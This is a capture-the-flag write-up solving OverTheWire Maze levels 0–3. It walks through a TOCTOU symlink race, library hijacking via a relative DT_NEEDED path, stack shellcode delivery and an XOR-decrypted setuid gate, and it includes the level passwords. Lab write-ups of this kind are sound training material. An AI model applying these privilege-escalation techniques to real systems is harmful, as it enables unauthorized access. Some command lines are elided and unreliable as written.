# OverTheWire Maze — Solutions

Every level solved live against `maze.labs.overthewire.org` (SSH, port 2225) in this run.
Maze levels are **setuid 32-bit binaries** under `/maze/`: `/maze/maze<N>` is owned by the
*next* user (`setuid maze<N+1>`), so the goal at each level is to run the level's binary and
make it **print the password for the next account**. That password then unlocks an SSH login
as `maze<N+1>`, from which you read `/etc/maze_pass/<next>` and move on.

For each level below: the goal, the technique and **why it works**, the exact commands, and a
**step-by-step account of the discovery process** (what the recording shows, where one exists,
or how the transcript unfolded otherwise). Per-level `cmds`/`out`/`pw` transcripts are in
`games/maze.json`; live notes in `tools/maze/l<N>/NOTES.md`; recordings in
`recordings/maze/L<N>.cast` where present.

**Verification rule used throughout:** a password is accepted only once an SSH login as the
next user works **and** `cat /etc/maze_pass/<next>` prints it.

---

## Level 0 → maze1

- **Account:** `maze0` (initial password `maze0`).
- **Goal:** get the password for `maze1` from `/maze/maze0`.
- **Technique and why it works:** `/maze/maze0` reads a fixed path
  `/tmp/128ecf542a35ac5270a87dc740918404` and does, in order:
  `access(PATH, R_OK)` → `setresuid(euid)` (drop to the setuid identity) → `open(PATH)` →
  read and print the contents. The **check and the open are two separate syscalls on the same
  path**, so the file that path names can change *between* them. That is the classic
  **check-then-open TOCTOU race**: pass `access()` a regular readable file you own, then swap
  the path to a symlink pointing at `/etc/maze_pass/maze1` before `open()` runs. `open()`
  follows the symlink, so it reads the password file while `access()` had already approved a
  harmless file. Because the swap happens in a tiny window, it only wins sometimes — so you
  run the binary in a tight loop and collect the rare winning outputs.
- **Commands:**
```
# 1. Disassemble to see the access()/open() split on the same fixed path
objdump -d /maze/maze0
# main(): access(PATH, R_OK) -> setresuid(euid) -> open(PATH) -> read/print
# PATH is /tmp/128ecf542a35ac5270a87dc740918404

# 2. Plant a readable filler file and a symlink to the next password
printf 'AAAA...' > /tmp/real_f
ln -s /etc/maze_pass/maze1 /tmp/link_s

# 3. A small C loop rename()s the fixed path back and forth between the two
#    (see the transcript in games/maze.json)

# 4. Fire the binary 15,000 times and keep the rare winners
for i in $(seq 15000); do /maze/maze0; done | sort | uniq -c
```
  Output: mostly `AAAA...` filler, but **132 winning runs** print `Sp5VmLGFC0`.

- **Step-by-step discovery and crafting** (from the narration script, `narration/maze/L0.txt`):
    1. **Read the binary first.** `objdump -d /maze/maze0` shows `main()` calls `access()` on a
       fixed `/tmp` path, drops privileges with `setresuid`, then `open()`s the *same* path and
       prints what it reads. The fixed path is a long md5-looking name.
    2. **Notice the two-step check.** Because `access()` and `open()` are separate calls on the
       same path, the file at that path can change in the gap. That gap is the whole exploit.
    3. **Build the two states.** A normal readable file full of `A`s at a path you own, and a
       symlink from the level's fixed path to `/etc/maze_pass/maze1`.
    4. **Race the rename.** A C loop flips the fixed path between the readable file and the
       symlink thousands of times while you run `/maze/maze0` in a loop.
    5. **Collect the winners.** Most runs see the readable file and print `A`s. The runs where the
       swap lands in the window pass the check on the file and `open()` the symlink: the
       password file comes back. 132 of 15,000 runs print `Sp5VmLGFC0`.
- **Password for maze1:** `Sp5VmLGFC0`
- **Verification:** confirmed by logging in as `maze1`. (Note 2026-11-17: the `maze0` login
  works again on the current lab, uid 15000 live, initial password `maze0`; the recorded solve
  stands.)
- **Recording:** none recorded — the transcript and narration are the record
  (`games/maze.json` L0, `narration/maze/L0.txt` + `L0.mp3`).

---

## Level 1 → maze2

- **Account:** `maze1`.
- **Goal:** get the password for `maze2` from `/maze/maze1`.
- **Technique and why it works:** `/maze/maze1` is setuid `maze2`, and its dynamic
  `DT_NEEDED` list includes `./libc.so.4` — a *relative* path (alongside the normal
  `libc.so.6`). A relative `DT_NEEDED` is resolved against the current working directory at
  exec time. So if you run the binary from a directory that contains a **planted**
  `libc.so.4`, the dynamic loader loads *your* library. A **constructor** in that library
  runs at load time — *before `main`* — with the setuid binary's fsuid (i.e. `maze2`), so it
  can `open()` and print `/etc/maze_pass/maze2` directly. No overflow, no shellcode: you just
  get code to run as `maze2` by controlling a library the binary is already going to load.
- **Commands:**
```
# 1. Confirm the relative DT_NEEDED
readelf -d /maze/maze1 | grep NEEDED
# 0x00000001 (RPATH/NEEDED) ... ./libc.so.4     <- the relative one
# 0x00000001 (NEEDED) ... libc.so.6

# 2. Build the planted library (tools/maze/l1/lib4.c) with a constructor
#    that reads /etc/maze_pass/maze2 and writes it to stdout.

# 3. Run the binary from a 755 dir containing the planted 32-bit libc.so.4
D=$(mktemp -d); chmod 755 "$D"; cp "$D/libc.so.4" ...; cd "$D"; /maze/maze1
# jJF6jn9qW6
# Hello World!
```

- **Step-by-step discovery and crafting** (from `tools/maze/l1/NOTES.md` + `lib4.c`):
    1. **Read the binary's load config.** `readelf -d /maze/maze1` reveals `DT_NEEDED ./libc.so.4`
       — a relative path. That is the hook: the loader will look for `libc.so.4` *in the
       current working directory* before anything else.
    2. **Plant a libc.so.4 with a constructor.** `lib4.c` defines an
       `__attribute__((constructor))` function that opens `/etc/maze_pass/maze2`, reads it, and
       `write()`s it to fd 1. Constructors run at load time, before `main`, and — because the
       binary is setuid — with the fsuid of the *owner* (`maze2`), which is exactly the identity
       that can read the password file.
    3. **Compile to a valid 32-bit shared object.** Two loader gotchas, both measured live:
       - the loader opens libraries using the setuid binary's **fsuid**, so the temp directory
       must be **755** (a 700 dir owned by `maze1` is unreadable by fsuid `maze2` → "Permission
       denied");
     - the planted file must be a **valid 32-bit ELF shared object** (an empty file → "file too
       short"; a 64-bit build → "wrong ELF class: ELFCLASS64").
  4. **Run from the planted directory.** `cd` into the 755 dir containing `libc.so.4` and run
     `/maze/maze1`. The loader loads the planted library, the constructor fires as `maze2`,
     and it prints `jJF6jn9qW6` (then `main` prints "Hello World!").
- **Password for maze2:** `jJF6jn9qW6`
- **Verification:** confirmed by logging in as `maze2` (uid 15002; `cat /etc/maze_pass/maze2`
  matches).
- **Recording:** `recordings/maze/L1.cast` — a genuine interactive SSH session as `maze1`
  (asciinema v3, typed commands + live output): `id`, `file`/`readelf -d` (the relative
  `./libc.so.4` NEEDED hook), `main` disassembly, ASLR check, the `lib4.c` constructor typed
  via heredoc, `gcc -m32` build of the planted `libc.so.4`, then `/maze/maze1` printing
  `jJF6jn9qW6` + "Hello World!". Recorded 2026-11-23 (real session, not a batch dump).
  Files: `tools/maze/l1/` (`lib4.c`, `NOTES.md`, live `maze1` copy).

---

## Level 2 → maze3

- **Account:** `maze2`.
- **Goal:** get the password for `maze3` from `/maze/maze2`.
- **Technique and why it works:** `main` (reconstructed from objdump with debug info) is:
```c
char buf[12];
void (*fp)(void) = &buf;      /* the address of buf is the function pointer */
if (argc != 2) exit(1);
strncpy(buf, argv[1], 8);     /* copy the first 8 bytes of argv[1] into buf */
fp();                         /* call buf — those 8 copied bytes now execute */
```
  The stack is **GNU_STACK RWE** (executable) and **ASLR is off**, so the 8 bytes you control
  via `argv[1]` run in place at a predictable stack address. The trick is that only **8 bytes**
  are copied, so you can't put full shellcode in `argv[1]`. Instead the 8 bytes are a tiny
  `push imm32; ret` (6 real bytes + 2 pad) that jumps to an **absolute address** where the real
  shellcode lives — a big **NOP sled** in the environment. The shellcode itself does the
  privilege work: `open("/etc/maze_pass/maze3")`, read, and write the bytes to fd 1 **and** fd 2
  (so the answer is unmissable), then exit.
- **Commands:**
```
# 1. Read the program: argc gate, strncpy(8), call through buf's address
objdump -d /maze/maze2          # lea eax,[ebp-0xc]; mov [ebp-0x10],eax; call eax
readelf -l /maze/maze2         # GNU_STACK RWE
getconf PAGESIZE; sysctl kernel.randomize_va_space   # ASLR off

# 2. Corrected int 0x80 shellcode (tools/maze/l2/sc.asm) assembles to 71 NUL-free bytes:
#    open("/etc/maze_pass/maze3") -> read -> write(count) to fd 1 AND fd 2 -> exit.
#    Path dwords pushed in REVERSE chunk order (aze3 first, /etc last) so the stack
#    holds "/etc/maze_pass/maze3\0" forwards.

# 3. Driver: env = 'A'*2000 + shellcode; sweep 4-aligned stack targets.
#    For each candidate address T: argv[1] = \x68 <T> \xc3 AA
#      (push imm32=T ; ret ; 2 pad bytes) -> jumps into the env sled at T.
#    Run /maze/maze2; stop when the 10-byte password is printed twice.
```
  Sweep hit at **0xffffd6e0**, dumping the 10-byte password twice (the fd1+fd2 signature):
  `pKWcO3NfC6`.

- **Step-by-step discovery and crafting** (from `tools/maze/l2/NOTES.md` + `narration/maze/L2.txt`):
    1. **Disassemble and find the call.** `main` copies the first 8 bytes of `argv[1]` into a
       12-byte buffer whose *address* is held in a function pointer, then calls through it. So the
       8 bytes you send in `argv[1]` are executed as code.
    2. **Prove the mechanism live.** Put `int3` in `argv[1]` → SIGTRAP; put 8 `A`s → the `A`s
       run as code and crash. Confirmed the 8 copied bytes execute at a known, RWE, non-ASLR stack
       address.
    3. **Decide on delivery.** 8 bytes is too small for the full shellcode, so make the 8 bytes a
       6-byte `push imm32; ret` that jumps to an absolute address, and hide the real shellcode in
       the environment behind a huge NOP sled (its exact address is fuzzy, the sled absorbs the
       error).
    4. **Write the shellcode to do the job.** `open("/etc/maze_pass/maze3")` via `int 0x80`, read
       into a stack buffer, `write()` the byte count to **fd 1 and fd 2**, exit. Crucially, push
       the path dwords in **reverse** chunk order so the assembled string reads forwards (this is
       the bug that bit the previous attempt — see below). 71 bytes, no NULs.
    5. **Sweep the target address.** For every 4-byte-aligned address from the low stack upward,
       build `argv[1] = \x68 <T> \xc3 AA`, run `/maze/maze2`, and stop when anything is printed.
       First hit at `0xffffd6e0`, printing the 10-char password twice.
    6. **The "it works but empty output" puzzle (the hard part).** The first shellcode attempt
       dumped nothing. Two independent bugs, both diagnosed:
       - the 85-byte pass-reader pushed its path dwords in **forward** chunk order, so the stack
         held the string *backwards* (`nib/hs//3ezam/ssap_ezam/cte/`) and `open()` returned
         ENOENT → empty output;
       - the marker-shell HIT condition could never match: a `execve("/bin//sh")` stage ran, but
         the spawned dash drops the elevated euid after `execve` (no `-p`), so `id` showed
         uid=15002 and the sweep's `uid=15003` condition never fired.
     Fix: read the file **inside the shellcode** before any `exec`, with the path dwords in
     reverse order.
- **Password for maze3:** `pKWcO3NfC6`
- **Verification:** confirmed by SSH login as `maze3` (uid 15003; `cat /etc/maze_pass/maze3`
  matches).
- **Recording:** `recordings/maze/L2.cast` (the trial run hit the same address `0xffffd6e0`).

---

## Level 3 → maze4

- **Account:** `maze3`.
- **Goal:** get the password for `maze4` from `/maze/maze3`.
- **Technique and why it works:** `/maze/maze3` is a tiny **hand-written assembly stub** (see below)
  statically linked, 0xa3 bytes of `.text`, entry `0x8049000`. It has two paths:
  - `argc == 1`: prints `./level4 ev0lcmds!` and exits (a red herring);
  - `argc != 1`: `mprotect(0x8049000, 0xa3, 7)` makes its own text page **RWX**, then
    XOR-decrypts 0x38 dwords at `0x804906b` with key `0x12345678` and falls into the
    decrypted bytes.
  So the "payload" is sitting in the binary, encrypted. You XOR it back with the key, read the
  resulting assembly, and learn its *gate*: it checks that `argv[1][0..3] == de c0 37 13`
  (little-endian `0x1337c0de`), and only if that matches does it `setreuid(15004,15004)`
  (= `maze4`) and `execve("/bin//sh")`. So the exploit is simply: **run `/maze/maze3`** with
  an argument whose first four bytes are `de c0 37 13` (`0x1337c0de` little-endian) — you
  get a shell as `maze4`.
- **Commands:**
```
# 1. Identify the program
file /maze/maze3                      # ELF 32-bit, statically linked, not stripped
readelf -h /maze/maze3 | grep -i entry # Entry point 0x8049000
objdump -d /maze/maze3                # whole .text is 0xa3 bytes; two paths

# 2. Recover the XOR-decrypted payload (key 0x12345678)
python3 - <<'PY'
key=0x12345678
# 0x38 dwords at 0x804906b (from the dumped section)
# payload -> pop eax; cmp [eax],0x1337c0de; jne exit;
#           ebx=0x3a9c(15004); eax=70(setreuid); int 0x80; execve("/bin//sh")
PY

# 3. Run with the argv magic
/maze/maze3 $(printf '\xde\xc0\x37\x13')
# uid=15004(maze4) gid=15003(maze3)
cat /etc/maze_pass/maze4   # MB583SjyFZ
```

- **Step-by-step discovery and crafting** (from `games/maze.json` L3 + `narration/maze/L3.txt`):
    1. **Read the stub.** `file`/`readelf`/`objdump -d` show the whole program is 0xa3 bytes with
       an `argc` branch: one path just prints a string, the other does the work.
    2. **Decode the work path.** The `argc != 1` branch `mprotect`s its text page to RWX, then
       XOR-decrypts 56 dwords at `0x804906b` with `0x12345678` and executes the result. So the real
       logic is the decrypted payload.
    3. **Decrypt it.** Re-XOR the 56 dwords with `0x12345678` (a short python one-liner) and read
       the revealed assembly: compare `[argv[1]]` against `0x1337c0de`, and on a match do
       `setreuid(15004,15004)` (maze4) + `execve("/bin//sh")`.
    4. **Meet the gate.** The argument must begin with the bytes `de c0 37 13`
       (`0x1337c0de` little-endian).
    5. **Run it.** `/maze/maze3 $(printf '\xde\xc0\x37\x13')` → shell as `maze4`
       (uid=15004, gid stays 15003). `cat /etc/maze_pass/maze4` → `MB583SjyFZ`.
- **Password for maze4:** `MB583SjyFZ`
- **Verification:** confirmed by SSH login as `maze4` (uid 15004; password file matches).
- **Recording:** `recordings/maze/L3.cast`.

---

## Level 4 → maze5 (in progress)

- **Account:** `maze4`.
- **Goal:** get the password for `maze5` from `/maze/maze4`.
- **Status:** in progress (2026-11-22). The `maze4` binary is downloaded to
  `tools/maze/l4/maze4`; static analysis (file / readelf / objdump, then a `maze5`-login
  verification via `ssh -p 2225`) is the next step. Recorded here as the continuation target;
  the full educational write-up for this level is added once it is solved and committed.
